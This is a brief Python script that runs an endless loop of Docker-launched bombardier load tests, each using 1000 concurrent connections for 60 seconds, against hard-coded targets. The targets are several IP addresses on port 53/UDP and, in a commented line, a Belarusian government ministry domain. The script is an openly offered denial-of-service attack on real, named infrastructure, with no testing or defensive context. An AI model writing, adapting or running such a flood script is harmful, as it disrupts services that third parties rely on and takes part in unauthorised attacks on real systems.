import os
#194.54.14.186:53/UDP
#194.54.14.187:53/UDP
#194.67.7.1:53/UDP
#194.67.2.109:53/UDP
#targets = ["mininform.gov.by"]
targets = ["194.54.14.186:53/UDP"]
time = 60
while True:
	for target in targets:
		os.system("sudo docker run -ti --rm alpine/bombardier -c 1000 -d " + str(time) + "s -l " + target)